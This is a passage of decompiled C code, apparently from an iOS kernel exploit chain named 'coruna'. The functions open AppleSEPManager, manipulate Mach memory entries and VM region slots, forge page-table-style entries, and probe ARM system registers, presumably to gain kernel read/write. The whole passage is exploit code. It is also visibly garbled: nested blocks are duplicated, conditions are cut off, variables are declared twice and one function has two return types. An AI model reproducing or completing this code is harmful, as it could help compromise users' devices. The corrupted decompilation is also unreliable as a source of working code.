        u = 0x2800f;
        if (status != 0) {
          handle = coruna_ptr_canonicalize(handle,bootargs);
          if (handle != 0) {
            status = coruna_kernel600c_residual_228(handle,bootargs + 0x30,&bootargs);
            u = 0x2800f;
            if (1 < thread_attr + 1) {
            _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,thread_attr);
            thread_attr = 0;
            }
            if (u == 0 || err == -1) {
            *(uint *)(addr + 0x3c) = u;
            if (u == 0) {
            u = 0xad001;
            do {
            err = ___semwait_signal(*(uint32_t *)(addr + 8),*(uint32_t *)(addr + 0xc),0,0,0,0);
            if (err != 0) {
            done:
            err = ___error();
            err = *err;
            ptr = (uint *)___error();
            u = -*ptr;
            if (-1 < err) {
            u = *ptr;
            }
            u = u | 0x40000000;
            {
            *(uint *)(addr + 0x3c) = u;
            if (*(char *)(addr + 0x38) != '\0') {
            return 0;
            }
            }
            }
            if (*(char *)(addr + 0x38) != '\0') {
            u = 0;
            {
            *(uint *)(addr + 0x3c) = u;
            if (*(char *)(addr + 0x38) != '\0') {
            return 0;
            }
            }
            }
            if (((*(long *)(addr + 0x20) == 0) || (*(long *)(addr + 0x28) == 0)) ||
            {
            *(uint *)(addr + 0x3c) = u;
            if (*(char *)(addr + 0x38) != '\0') {
            return 0;
            }
            }
            scratch = *(long *)(addr + 0x20) + -0x30;
            err = coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(handle,*(long *)(addr + 0x18) + 8,&scratch,
            *(uint32_t *)(handle + 0x168),1);
            if (err == 0) break;
            bootargs = **(long **)(addr + 0x28);
            err = _setsockopt(*(int *)(addr + 0x10),2,0x10,&bootargs,8);
            {
            err = ___error();
            err = *err;
            ptr = (uint *)___error();
            u = -*ptr;
            if (-1 < err) {
            u = *ptr;
            }
            u = u | 0x40000000;
            {
            *(uint *)(addr + 0x3c) = u;
            if (*(char *)(addr + 0x38) != '\0') {
            return 0;
            }
            }
            }
            scratch.sa_len = '\0';
            scratch.sa_family = '\0';
            scratch.sa_data[0] = '\0';
            scratch.sa_data[1] = '\0';
            scratch.sa_data[2] = '\0';
            scratch.sa_data[3] = '\0';
            scratch.sa_data[4] = '\0';
            scratch.sa_data[5] = '\0';
            err = coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(handle,*(long *)(addr + 0x18) + 8,&scratch,
            *(uint32_t *)(handle + 0x168),1);
            } while (err != 0);
            u = 0x28010;
            cleanup:
            *(uint *)(addr + 0x3c) = u;
            if (*(char *)(addr + 0x38) != '\0') {
            return 0;
            }
            }
            }
            else {
            _close(err);
            *(uint *)(addr + 0x3c) = u;
            }
            _semaphore_signal(*(semaphore_t *)(addr + 0xc));
            return 0;
            handle = coruna_ptr_canonicalize(handle,bootargs);
            if (handle != 0) {
              u = 0;
              *(int *)(addr + 0x10) = err;
              *(long *)(addr + 0x18) = bootargs;
              if (1 < thread_attr + 1) {
              _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,thread_attr);
              thread_attr = 0;
              }
              if (u == 0 || err == -1) {
              *(uint *)(addr + 0x3c) = u;
              if (u == 0) {
              u = 0xad001;
              do {
              err = ___semwait_signal(*(uint32_t *)(addr + 8),*(uint32_t *)(addr + 0xc),0,0,0,0);
              if (err != 0) {
              done:
              err = ___error();
              err = *err;
              ptr = (uint *)___error();
              u = -*ptr;
              if (-1 < err) {
              u = *ptr;
              }
              u = u | 0x40000000;
              {
              *(uint *)(addr + 0x3c) = u;
              if (*(char *)(addr + 0x38) != '\0') {
              return 0;
              }
              }
              }
              if (*(char *)(addr + 0x38) != '\0') {
              u = 0;
              {
              *(uint *)(addr + 0x3c) = u;
              if (*(char *)(addr + 0x38) != '\0') {
              return 0;
              }
              }
              }
              if (((*(long *)(addr + 0x20) == 0) || (*(long *)(addr + 0x28) == 0)) ||
              {
              *(uint *)(addr + 0x3c) = u;
              if (*(char *)(addr + 0x38) != '\0') {
              return 0;
              }
              }
              scratch = *(long *)(addr + 0x20) + -0x30;
              err = coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(handle,*(long *)(addr + 0x18) + 8,&scratch,
              *(uint32_t *)(handle + 0x168),1);
              if (err == 0) break;
              bootargs = **(long **)(addr + 0x28);
              err = _setsockopt(*(int *)(addr + 0x10),2,0x10,&bootargs,8);
              {
              err = ___error();
              err = *err;
              ptr = (uint *)___error();
              u = -*ptr;
              if (-1 < err) {
              u = *ptr;
              }
              u = u | 0x40000000;
              {
              *(uint *)(addr + 0x3c) = u;
              if (*(char *)(addr + 0x38) != '\0') {
              return 0;
              }
              }
              }
              scratch.sa_len = '\0';
              scratch.sa_family = '\0';
              scratch.sa_data[0] = '\0';
              scratch.sa_data[1] = '\0';
              scratch.sa_data[2] = '\0';
              scratch.sa_data[3] = '\0';
              scratch.sa_data[4] = '\0';
              scratch.sa_data[5] = '\0';
              err = coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(handle,*(long *)(addr + 0x18) + 8,&scratch,
              *(uint32_t *)(handle + 0x168),1);
              } while (err != 0);
              u = 0x28010;
              cleanup:
              *(uint *)(addr + 0x3c) = u;
              if (*(char *)(addr + 0x38) != '\0') {
              return 0;
              }
              }
              }
              else {
              _close(err);
              *(uint *)(addr + 0x3c) = u;
              }
              _semaphore_signal(*(semaphore_t *)(addr + 0xc));
              return 0;
            }
          }
          u = 0x28026;
        }
      }
      if (1 < thread_attr + 1) {
      _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,thread_attr);
      thread_attr = 0;
      }
      if (u == 0 || err == -1) {
      *(uint *)(addr + 0x3c) = u;
      if (u == 0) {
      u = 0xad001;
      do {
      err = ___semwait_signal(*(uint32_t *)(addr + 8),*(uint32_t *)(addr + 0xc),0,0,0,0);
      if (err != 0) {
      done:
      err = ___error();
      err = *err;
      ptr = (uint *)___error();
      u = -*ptr;
      if (-1 < err) {
      u = *ptr;
      }
      u = u | 0x40000000;
      {
      *(uint *)(addr + 0x3c) = u;
      if (*(char *)(addr + 0x38) != '\0') {
      return 0;
      }
      }
      }
      if (*(char *)(addr + 0x38) != '\0') {
      u = 0;
      {
      *(uint *)(addr + 0x3c) = u;
      if (*(char *)(addr + 0x38) != '\0') {
      return 0;
      }
      }
      }
      if (((*(long *)(addr + 0x20) == 0) || (*(long *)(addr + 0x28) == 0)) ||
      {
      *(uint *)(addr + 0x3c) = u;
      if (*(char *)(addr + 0x38) != '\0') {
      return 0;
      }
      }
      scratch = *(long *)(addr + 0x20) + -0x30;
      err = coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(handle,*(long *)(addr + 0x18) + 8,&scratch,
      *(uint32_t *)(handle + 0x168),1);
      if (err == 0) break;
      bootargs = **(long **)(addr + 0x28);
      err = _setsockopt(*(int *)(addr + 0x10),2,0x10,&bootargs,8);
      {
      err = ___error();
      err = *err;
      ptr = (uint *)___error();
      u = -*ptr;
      if (-1 < err) {
      u = *ptr;
      }
      u = u | 0x40000000;
      {
      *(uint *)(addr + 0x3c) = u;
      if (*(char *)(addr + 0x38) != '\0') {
      return 0;
      }
      }
      }
      scratch.sa_len = '\0';
      scratch.sa_family = '\0';
      scratch.sa_data[0] = '\0';
      scratch.sa_data[1] = '\0';
      scratch.sa_data[2] = '\0';
      scratch.sa_data[3] = '\0';
      scratch.sa_data[4] = '\0';
      scratch.sa_data[5] = '\0';
      err = coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(handle,*(long *)(addr + 0x18) + 8,&scratch,
      *(uint32_t *)(handle + 0x168),1);
      } while (err != 0);
      u = 0x28010;
      cleanup:
      *(uint *)(addr + 0x3c) = u;
      if (*(char *)(addr + 0x38) != '\0') {
      return 0;
      }
      }
      }
      else {
      _close(err);
      *(uint *)(addr + 0x3c) = u;
      }
      _semaphore_signal(*(semaphore_t *)(addr + 0xc));
      return 0;
    }
  }
  err = ___error();
  status = *err;
  ptr = (uint *)___error();
  u = -*ptr;
  if (-1 < status) {
    u = *ptr;
  }
  u = u | 0x40000000;
fail:
  if (1 < thread_attr + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,thread_attr);
    thread_attr = 0;
  }
  if (u == 0 || err == -1) {
    *(uint *)(addr + 0x3c) = u;
    if (u == 0) {
      u = 0xad001;
      do {
        err = ___semwait_signal(*(uint32_t *)(addr + 8),*(uint32_t *)(addr + 0xc),0,0,0,0);
        if (err != 0) {
done:
          err = ___error();
          err = *err;
          ptr = (uint *)___error();
          u = -*ptr;
          if (-1 < err) {
            u = *ptr;
          }
          u = u | 0x40000000;
          {
            *(uint *)(addr + 0x3c) = u;
            if (*(char *)(addr + 0x38) != '\0') {
            return 0;
            }
          }
        }
        if (*(char *)(addr + 0x38) != '\0') {
          u = 0;
          {
            *(uint *)(addr + 0x3c) = u;
            if (*(char *)(addr + 0x38) != '\0') {
            return 0;
            }
          }
        }
        if (((*(long *)(addr + 0x20) == 0) || (*(long *)(addr + 0x28) == 0)) ||
           {
             *(uint *)(addr + 0x3c) = u;
             if (*(char *)(addr + 0x38) != '\0') {
             return 0;
             }
           }
        scratch = *(long *)(addr + 0x20) + -0x30;
        err = coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(handle,*(long *)(addr + 0x18) + 8,&scratch,
                             *(uint32_t *)(handle + 0x168),1);
        if (err == 0) break;
        bootargs = **(long **)(addr + 0x28);
        err = _setsockopt(*(int *)(addr + 0x10),2,0x10,&bootargs,8);
        {
          err = ___error();
          err = *err;
          ptr = (uint *)___error();
          u = -*ptr;
          if (-1 < err) {
          u = *ptr;
          }
          u = u | 0x40000000;
          {
          *(uint *)(addr + 0x3c) = u;
          if (*(char *)(addr + 0x38) != '\0') {
          return 0;
          }
          }
        }
        scratch.sa_len = '\0';
        scratch.sa_family = '\0';
        scratch.sa_data[0] = '\0';
        scratch.sa_data[1] = '\0';
        scratch.sa_data[2] = '\0';
        scratch.sa_data[3] = '\0';
        scratch.sa_data[4] = '\0';
        scratch.sa_data[5] = '\0';
        err = coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(handle,*(long *)(addr + 0x18) + 8,&scratch,
                             *(uint32_t *)(handle + 0x168),1);
      } while (err != 0);
      u = 0x28010;
cleanup:
      *(uint *)(addr + 0x3c) = u;
      if (*(char *)(addr + 0x38) != '\0') {
        return 0;
      }
    }
  }
  else {
    _close(err);
    *(uint *)(addr + 0x3c) = u;
  }
  _semaphore_signal(*(semaphore_t *)(addr + 0xc));
  return 0;
}





uint coruna_open_sepmgr_1f500(long handle,uint64_t val,uint64_t id_2)
{
  long handle;
  int err;
  uint u;
  uint size;
  long addr;
  unsigned long version;
  long scratch;
  
  version = (unsigned long)*(uint *)(handle + 0x10);
  if (*(uint *)(handle + 0x10) + 1 < 2) {
    version = coruna_ioservicegetmatchingservice_1bb7c("AppleSEPManager");
    if ((int)version + 1U < 2) {
      return 0xad011;
    }
    *(int *)(handle + 0x10) = (int)version;
  }
  addr = *(long *)(handle + 0x18);
  if (addr == 0) {
    addr = coruna_kernel600c_via_return_zero_28118(handle,version);
    if (addr == 0) {
      return 0x2800e;
    }
    *(long *)(handle + 0x18) = addr;
  }
  handle = *(long *)(handle + 0x20);
  if (*(long *)(handle + 0x20) == 0) {
    err = coruna_kernel600c_residual_228(handle,addr + 0x28,&scratch);
    if (err == 0) {
      return 0x2800f;
    }
    *(long *)(handle + 0x20) = scratch;
    handle = scratch;
  }
  scratch = handle;
  err = coruna_mach_vm_machine_attribute_1e63c(handle,addr + 0x28,val,0);
  size = 0x28010;
  if (err != 0) {
    u = __IOServiceSetAuthorizationID(version,id_2);
    size = 0;
    if (u != 0) {
      if (u == 0x35) {
        if (*(char *)(handle + 0xc) == '\0') {
          size = coruna_kernel600c_via_kernel600c_via_kernel600c_via_fd_read_full_5(handle,*(uint32_t *)k_kernel_mach_task_self_slot,0,0);
        }
        else {
          *(uint8_t *)(handle + 0xc) = 0;
          size = coruna_kernel600c_via_kernel600c_via_kernel600c_via_fd_read_full_5(handle,*(uint32_t *)k_kernel_mach_task_self_slot,0,0);
          *(uint8_t *)(handle + 0xc) = 1;
        }
        if (size == 0) {
          u = __IOServiceSetAuthorizationID(version,id_2);
          size = 0;
          if (u != 0) {
            size = u & 0xfff | 0x70000000;
          }
        }
      }
      else {
        size = u & 0xfff | 0x70000000;
      }
    }
    err = coruna_mach_vm_machine_attribute_1e63c(handle,addr + 0x28,scratch,0);
    u = 0x28010;
    if (size != 0) {
      u = size;
    }
    if (err == 0) {
      size = u;
    }
  }
  return size;
}





int coruna_open_dev_null_1f6c8(char **path)
{
  int err;
  int status;
  int flags;
  pid_t lp4;
  int *err;
  uint scratch;
  pid_t bootargs;
  posix_spawn_file_actions_t thread_attr;
  sigset_t host_info;
  posix_spawnattr_t serial_buf;
  
  flags = 0xad00b;
  serial_buf = (posix_spawnattr_t)0x0;
  thread_attr = (posix_spawn_file_actions_t)0x0;
  scratch = 0xffffffff;
  bootargs = -1;
  status = 0xad001;
  if ((((path != (char **)0x0) && (*path != (char *)0x0)) && (**path != '\0')) &&
     (err = _posix_spawnattr_init(&serial_buf), status = flags, err == 0)) {
    host_info = 0xffffffff;
    status = _posix_spawnattr_setflags(&serial_buf,7);
    if (((status == 0) && (status = _posix_spawnattr_setsigdefault(&serial_buf,&host_info), status == 0))
       && ((status = _posix_spawnattr_setpgroup(&serial_buf,0), status == 0 &&
           (status = _posix_spawn_file_actions_init(&thread_attr), status == 0)))) {
      flags = _posix_spawn_file_actions_addopen(&thread_attr,0,"/dev/null",0x20000,0);
      if (((flags == 0) &&
          (flags = _posix_spawn_file_actions_addopen(&thread_attr,1,"/dev/null",0x20201,0), flags == 0)
          ) && ((flags = _posix_spawn_file_actions_addopen(&thread_attr,2,"/dev/null",0x20201,0),
                flags == 0 &&
                (flags = _posix_spawn(&bootargs,*path,&thread_attr,&serial_buf,path,(char **)0x0),
                flags == 0)))) {
        flags = 0xad00b;
        do {
          lp4 = _waitpid(bootargs,(int *)&scratch,0);
          if (lp4 == bootargs) {
            if (lp4 != -1) goto fail;
            flags = 0;
          }
          else {
            if (lp4 != -1) break;
            ___error();
          }
          err = ___error();
        } while (*err == 4);
        if (flags == 0) {
fail:
          status = 0;
          if ((scratch & 0xff00) != 0) {
            status = 0xad00b;
          }
          flags = 0xad00b;
          if ((scratch & 0x7f) == 0) {
            flags = status;
          }
        }
      }
      else {
        flags = 0xad00b;
      }
      _posix_spawn_file_actions_destroy(&thread_attr);
    }
    _posix_spawnattr_destroy(&serial_buf);
    status = flags;
  }
  return status;
}





void coruna_kernel29d3c_via_free_1b984(long handle)
{
  if (*(long *)(&k_kernel_slot_18d0 + handle) != 0) {
    coruna_free_1b984();
    return;
  }
  return;
}





uint64_t coruna_return_zero_1f898(uint64_t val,uint64_t id_2,int flags)
{
  uint u;
  int err;
  int status;
  long handle;
  unsigned long size;
  unsigned long *ptr;
  long addr;
  uint64_t version;
  int scratch;
  int bootargs;
  uint32_t thread_attr;
  unsigned long host_info;
  unsigned long serial_buf;
  unsigned long action;
  uint8_t block_ctx[32];
  long stack_guard;
  uint32_t sa_saved[2];
  long sa_new;
  uint8_t path_buf[8];
  uint8_t tmp_buf[8];
  unsigned long region;
  uint32_t plist;
  char url_buf;
  uint64_t json_buf;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t frame;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t work;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t cache;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t cache_20;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t cache_21;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t cache_22;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t cache_23;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  uint64_t cache_24;
  
  bootargs = flags;
  err = coruna_ctx_test_flag(val,0x200000);
  version = 0x206000000;
  if (err != 0) {
    version = 0x406000000;
  }
  scratch = 0;
  handle = coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_17fcc_3(val,id_2);
  if ((handle == 0) || (err = coruna_mach_absolute_time_1fd30(val,1), err == 0)) {
    return 0;
  }
  err = coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_1c57c(val,&url_buf,&serial_buf);
  version = 0;
  coruna_slot_clear(val,3);
  return version;
}





long coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_17fcc_3(long handle,unsigned long arg)
{
  int err;
  long handle;
  uint8_t scratch[32];
  unsigned long bootargs;
  
  err = coruna_call_mach_vm_machine_attribute_29df8_17fcc(handle,arg & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),
                       scratch);
  if ((err == 0) || (bootargs == 0)) {
    handle = 0;
  }
  else {
    handle = (*(unsigned long *)(handle + 0x188) & arg) + (bootargs & 0xffffffffc000);
  }
  return handle;
}





uint64_t coruna_mach_absolute_time_1fd30(long handle,int flags)
{
  unsigned long u;
  int err;
  uint64_t size;
  long handle;
  
  if (flags == 0) {
    coruna_slot_clear(handle,3);
  }
  else {
    if (((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) &&
       (handle = *(long *)(*(long *)(handle + 0x118) + 0x150), handle != 0)) {
      size = _mach_absolute_time();
      u = 0;
      if ((unsigned long)*(uint *)(handle + 0x260) != 0) {
        u = ((size - handle) * (unsigned long)*(uint *)(handle + 0x25c)) /
                (unsigned long)*(uint *)(handle + 0x260);
      }
      if (u < 20000000) {
        coruna_semaphore_timedwait(handle,(0x14 - (int)((u & 0xffffffff) / 1000000)) * 1000);
      }
    }
    err = coruna_mach_absolute_time_1c000(handle,3,31000);
    if (err != 0) {
      return 0;
    }
    if ((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) {
      size = _mach_absolute_time();
      *(uint64_t *)(*(long *)(handle + 0x118) + 0x150) = size;
    }
  }
  return 1;
}





uint64_t
void coruna_kernel600c_via_mach_absolute_time_20e4c(uint64_t val,uint64_t id_2,unsigned long arg,uint32_t *size,uint size_x,
            uint64_t size_3)
{
  long handle;
  uint32_t u;
  int err;
  unsigned long size;
  unsigned long version;
  uint64_t port;
  long addr;
  unsigned long tag;
  uint8_t scratch;
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t host_info;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t serial_buf;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t action;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t block_ctx;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t stack_guard;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t sa_saved;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  unsigned long sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint32_t region[5];
  
  cache_22 = 0;
  sa_saved = 0;
  cache_24 = 0;
  cache_23 = 0;
  cache = 0;
  stack_guard = 0;
  cache_21 = 0;
  cache_20 = 0;
  json_buf = 0;
  block_ctx = 0;
  work = 0;
  frame = 0;
  region = 0;
  action = 0;
  url_buf = 0;
  plist = 0;
  sa_new = 0;
  serial_buf = 0;
  tmp_buf = 0;
  path_buf = 0;
  block_ctx = 0;
  host_info = 0;
  sa_saved = 0;
  stack_guard = 0;
  host_info = 0;
  thread_attr = 0;
  action = 0;
  serial_buf = 0;
  scratch = 0;
  bootargs = 0;
  thread_attr = 0;
  bootargs = 0;
  scratch = 0;
  err = coruna_mach_absolute_time_2030c(val,id_2,&bootargs);
  port = 0;
  if (err != 0) {
    err = coruna_mach_absolute_time_20584(val,&bootargs,0,size_3);
    port = 0;
    if (err != 0) {
      if (size_x == 0) {
        port = 1;
      }
      else {
        addr = 0;
        version = (unsigned long)size_x;
        tag = arg;
        do {
          version = version - 1;
          u = *size;
          path_buf = 0;
          tmp_buf = 0;
          err = coruna_ctx_test_flag(val,0x200000);
          handle = -0x800000000;
          if (err != 0) {
            handle = -0x10000000000;
          }
          err = coruna_mach_absolute_time_20c14(&bootargs,1,&tmp_buf);
          if ((err == 0) || (err = coruna_mach_absolute_time_20c14(&bootargs,0,&path_buf), err == 0)) {
fail:
            port = 0;
            break;
          }
          size = tag;
          if (cache_20 != '\0') {
            err = coruna_mach_absolute_time_20e4c(&bootargs,0,handle + tag);
            if ((((err != 0) && (err = coruna_mach_absolute_time_20d4c(&bootargs,0xd5087820), err != 0)) &&
                (err = coruna_mach_absolute_time_20d4c(&bootargs,0xd5387400), err != 0)) &&
               ((err = coruna_mach_absolute_time_20c14(&bootargs,0,&sa_new), err != 0 &&
                ((sa_new & 0xffffffffc000) == (tag & 0xffffffffffffc000))))) {
              size = handle + arg + addr * 4;
              err = coruna_mach_absolute_time_20e4c(&bootargs,0,size);
              coruna_mach_absolute_time_20e4c(&bootargs,1,tmp_buf);
              coruna_mach_absolute_time_20e4c(&bootargs,0,path_buf);
              port = 0;
              break;
            }
cleanup:
            coruna_mach_absolute_time_20e4c(&bootargs,1,tmp_buf);
            coruna_mach_absolute_time_20e4c(&bootargs,0,path_buf);
            port = 0;
            break;
          }
done:
          err = coruna_mach_absolute_time_20e4c(&bootargs,0,size);
          coruna_mach_absolute_time_20e4c(&bootargs,1,tmp_buf);
          coruna_mach_absolute_time_20e4c(&bootargs,0,path_buf);
          port = 0;
          break;
        } while (version != 0);
      }
      if (cache_20 != '\0') {
        coruna_kernel600c_via_mach_absolute_time_20e4c_2(val,&bootargs);
      }
      err = coruna_ctx_test_flag(val,0x84000);
      if ((err != 0) && (cache_20 != '\0')) {
        coruna_kernel29d3c_via_mach_absolute_time_20d4c_2(&bootargs,&scratch);
      }
      coruna_mach_absolute_time_20ae8(&bootargs);
    }
    coruna_kernel600c_via_call_mach_port_deallocate_2ddc8(val,&bootargs);
  }
  return port;
}





uint64_t coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_1c57c(uint64_t val,uint64_t id_2,uint64_t *size_3)
{
  uint64_t u;
  long scratch;
  
  scratch = 0;
  u = coruna_kernel600c_via_return_zero_2b63c(val,10,&scratch);
  if ((int)u != 0) {
    *(bool *)id_2 = scratch != 0;
    if (scratch == 0) {
      size_3[0xc] = 0;
      size_3[9] = 0;
      size_3[8] = 0;
      size_3[0xb] = 0;
      size_3[10] = 0;
      size_3[5] = 0;
      size_3[4] = 0;
      size_3[7] = 0;
      size_3[6] = 0;
      size_3[1] = 0;
      *size_3 = 0;
      size_3[3] = 0;
      size_3[2] = 0;
    }
    else {
      u = coruna_call_mach_vm_machine_attribute_29df8_1c57c(val,scratch,0x68,size_3);
      if ((int)u == 0) {
        return u;
      }
    }
    u = 1;
  }
  return u;
}
uint64_t coruna_kernel600c_via_cat(uint64_t val,long *handle,long *addr_2,uint32_t *size)
{
  long handle;
  int err;
  void *ptr;
  long addr;
  long off;
  long base;
  long ctx_val;
  long serial;
  
  err = coruna_ctx_test_flag(val,0x200000);
  handle = 0x800000000;
  if (err != 0) {
    handle = 0x10000000000;
  }
  ptr = _malloc(0x4000);
  if (ptr != (void *)0x0) {
    *size = 0x4000;
    addr = coruna_mach_port_request_notification_2c77c(val,size);
    *handle = addr;
    if (addr != 0) {
      addr = coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_17fcc_3(val,addr);
      *addr_2 = addr;
      if (addr != 0) {
        addr = 0;
        off = k_kernel_rodata_word_37770;
        base = k_kernel_rodata_word_00037778;
        do {
          ctx_val = off * 0x2000000 + handle;
          serial = base * 0x2000000 + handle;
          ((unsigned long *)((long)ptr + addr))[1] =
               (unsigned long)coruna_cat(0xc0,coruna_cat((char)((unsigned long)serial >> 0x28),
                                             coruna_u64_pack14(((char)((unsigned long)serial >> 0x20)), (coruna_cat((char))((unsigned long)serial >> 0x18),0x451)))
                              );
          *(unsigned long *)((long)ptr + addr) =
               (unsigned long)coruna_cat(0xc0,coruna_cat((char)((unsigned long)ctx_val >> 0x28),
                                             coruna_u64_pack14(((char)((unsigned long)ctx_val >> 0x20)), (coruna_cat((char))((unsigned long)ctx_val >> 0x18),0x451)))
                              );
          off = off + 2;
          base = base + 2;
          addr = addr + 0x10;
        } while (addr != 0x4000);
        err = coruna_call_mach_vm_machine_attribute_29df8_1e994(val,*handle,ptr,0x4000);
        _free(ptr);
        if (err != 0) {
          return 1;
        }
        if (*handle != 0) {
        coruna_mach_port_allocate(val,*handle,*size);
        *handle = 0;
        }
        return 0;
      }
    }
    _free(ptr);
  }
fail:
  if (*handle != 0) {
    coruna_mach_port_allocate(val,*handle,*size);
    *handle = 0;
  }
  return 0;
}





uint64_t coruna_mach_absolute_time_2030c(uint64_t val,long handle,uint64_t *id_2)
{
  uint64_t *ptr;
  uint64_t *buf;
  unsigned long u;
  bool err;
  int err;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  uint64_t tag;
  uint64_t kind;
  double ld11;
  double ld12;
  unsigned long type_id;
  mach_timebase_info_t scratch;
  uint bootargs;
  
  scratch.numer = 0;
  scratch.denom = 0;
  _mach_timebase_info(&scratch);
  type_id = (unsigned long)scratch & 0xffffffff;
  u = (unsigned long)scratch >> 0x20;
  size = _mach_absolute_time();
  id_2[1] = 0;
  *id_2 = 0;
  id_2[3] = 0;
  id_2[2] = 0;
  id_2[5] = 0;
  id_2[4] = 0;
  id_2[7] = 0;
  id_2[6] = 0;
  id_2[9] = 0;
  id_2[8] = 0;
  id_2[0xb] = 0;
  id_2[10] = 0;
  id_2[0xd] = 0;
  id_2[0xc] = 0;
  id_2[0xf] = 0;
  id_2[0xe] = 0;
  id_2[0x11] = 0;
  id_2[0x10] = 0;
  id_2[0x13] = 0;
  id_2[0x12] = 0;
  id_2[0x15] = 0;
  id_2[0x14] = 0;
  id_2[0x17] = 0;
  id_2[0x16] = 0;
  id_2[0x19] = 0;
  id_2[0x18] = 0;
  id_2[0x1b] = 0;
  id_2[0x1a] = 0;
  ptr = id_2 + 0x19;
  id_2[0x1d] = 0;
  id_2[0x1c] = 0;
  id_2[0x1f] = 0;
  id_2[0x1e] = 0;
  coruna_ptr_store(val,ptr);
  err = coruna_call_mach_make_memory_entry_2da70(ptr,handle + 0x40000,id_2);
  if ((err != 0) || (err = coruna_call_mach_make_memory_entry_2da70(ptr,handle + 0x10000,id_2 + 8), err != 0))
  coruna_kernel600c_via_call_mach_port_deallocate_2ddc8(val,id_2);
  return 0;
}





uint64_t coruna_mach_absolute_time_20584(uint64_t val,long handle,byte arg,byte arg)
{
  long handle;
  bool err;
  double ld3;
  int err;
  uint u;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  uint64_t tag;
  unsigned long kind;
  bool status;
  byte flags;
  uint type_id;
  mach_timebase_info_t lm14;
  double ld15;
  double ld16;
  double ld17;
  double ld18;
  mach_timebase_info_t scratch;
  uint64_t bootargs;
  long thread_attr;
  unsigned long host_info;
  uint8_t scratch;
  uint serial_buf;
  uint32_t bootargs;
  unsigned long action;
  mach_timebase_info_t block_ctx [2];
  
  scratch.numer = 0;
  scratch.denom = 0;
  _mach_timebase_info(&scratch);
  ld3 = k_kernel_rodata_word_37740;
  ld15 = (double)NEON_ucvtf((unsigned long)scratch >> 0x20);
  ld17 = (double)NEON_ucvtf((unsigned long)scratch & 0xffffffff);
  ld17 = (ld15 / ld17) * k_kernel_rodata_word_37740;
  size = _mach_absolute_time();
  ld15 = k_kernel_rodata_word_374d0;
  ld17 = ld17 * k_kernel_rodata_word_37780;
  handle = handle + 0x40;
  status = true;
  do {
    if ((status) && (err = coruna_ctx_test_flag(val,0x84000), err != 0)) {
      flags = (arg | arg) ^ 1;
    }
    else {
      flags = 0;
    }
    version = _mach_absolute_time();
    if ((unsigned long)(long)(ld17 + (double)size) <= version) {
      return 0;
    }
    if (((flags & 1) != 0) && (port = coruna_dlopen_iosurface_1abf4(val,handle + 0xd8), (int)port == 0)) {
      return port;
    }
    action = 0;
    serial_buf = 0;
    err = coruna_vm_region_slot_read(handle,0,&action);
    if (((err == 0) || ((action & 0x90000000) != 0)) ||
       (err = coruna_vm_region_slot_write(handle,0,action | 0x80000000), err == 0)) {
fail:
      if (*(char *)(handle + 0xc0) != '\0') {
        coruna_mach_absolute_time_20ae8(handle);
      }
      return 0;
    }
    *(uint8_t *)(handle + 0xc0) = 1;
    bootargs = 0;
    block_ctx[0].numer = 0;
    block_ctx[0].denom = 0;
    _mach_timebase_info(block_ctx);
    ld16 = (double)NEON_ucvtf((unsigned long)block_ctx[0] >> 0x20);
    ld18 = (double)NEON_ucvtf((unsigned long)block_ctx[0] & 0xffffffff);
    version = _mach_absolute_time();
    do {
      tag = _mach_absolute_time();
      if (((unsigned long)(long)((ld16 / ld18) * ld3 * ld15 + (double)version) <= tag) ||
         if (*(char *)(handle + 0xc0) != '\0') {
         coruna_mach_absolute_time_20ae8(handle);
         }
         return 0;
    } while ((bootargs >> 4 & 1) == 0);
    err = coruna_vm_region_read_u32(handle,0xfb4,&serial_buf);
    type_id = serial_buf;
    if (*(char *)(handle + 0xc0) != '\0') {
    coruna_mach_absolute_time_20ae8(handle);
    }
    return 0;
  } while( true );
}





void coruna_kernel600c_via_call_mach_port_deallocate_2ddc8(uint64_t val,long handle)
{
